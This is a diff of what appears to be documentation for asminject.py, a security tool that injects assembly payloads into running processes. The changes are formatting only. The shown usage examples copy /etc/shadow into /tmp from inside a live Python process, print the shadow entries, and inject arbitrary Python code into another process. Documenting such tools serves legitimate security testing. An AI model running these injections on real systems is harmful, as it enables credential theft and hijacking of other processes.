@@ -34,11 +34,13 @@ This payload requires two variables: `sourcefile` and `destfile`.
 root     2036577  [...] python3 practice/python_loop.py
 
 # python3 ./asminject.py 2036577 copy_file_using_syscalls.s \
-   --var sourcefile "/etc/shadow" --var destfile "/tmp/bishopfox.txt"
+   --var sourcefile "/etc/shadow" \
+   --var destfile "/tmp/bishopfox.txt"
 
 ...omitted for brevity...
 
-# cat /tmp/shadow_copied_using_syscalls.txt 
+# cat /tmp/shadow_copied_using_syscalls.txt
+
 root:!:18704:0:99999:7:::
 daemon:*:18704:0:99999:7:::
 bin:*:18704:0:99999:7:::
@@ -62,6 +64,7 @@ In a separate terminal, locate the process and inject some arbitrary Python code
 
 This payload requires one variable: `pythoncode`, which should contain the Python script code to execute in the existing Python process.
 
+```
 # python3 ./asminject.py 2037475 execute_python_code.s \
    --relative-offsets-from-binaries \
    --non-pic-binary "/usr/bin/python3\\.[0-9]+" \
